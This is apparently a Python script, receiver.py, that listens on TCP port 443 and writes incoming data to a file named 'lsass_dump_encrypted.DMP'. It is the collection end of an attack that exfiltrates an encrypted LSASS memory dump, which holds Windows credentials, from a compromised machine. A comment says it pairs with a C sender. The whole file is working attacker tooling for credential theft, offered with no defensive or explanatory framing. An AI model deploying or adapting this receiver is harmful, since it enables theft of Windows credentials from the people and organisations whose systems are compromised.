# receiver.py
import socket
import sys

HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 443       # Must match DEST_PORT in C code

def save_to_file(data, filename):
    with open(filename, 'wb') as f:
        f.write(data)
    print(f"[+] Saved {len(data)} bytes to {filename}")

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        print(f"[*] Listening on {HOST}:{PORT}")

        conn, addr = s.accept()
        with conn:
            print(f"[+] Connection from {addr}")

            # First receive the size (4 bytes)
            size_data = conn.recv(4)
            if len(size_data) != 4:
                print("[-] Invalid size header")
                return

            size = int.from_bytes(size_data, 'little')
            print(f"[+] Expecting {size} bytes")

            # Receive data in chunks
            received = 0
            data = bytearray()
            while received < size:
                chunk = conn.recv(min(4096, size - received))
                if not chunk:
                    break
                data.extend(chunk)
                received += len(chunk)
                print(f"[+] Received {received}/{size} bytes ({received/size*100:.2f}%)", end='\r')

            print(f"\n[+] Received {len(data)} bytes total")

            if len(data) == size:
                save_to_file(data, 'lsass_dump_encrypted.DMP')  # Changed extension to .DMP
            else:
                print(f"[-] Size mismatch (expected {size}, got {len(data)})")

if __name__ == '__main__':
    main()
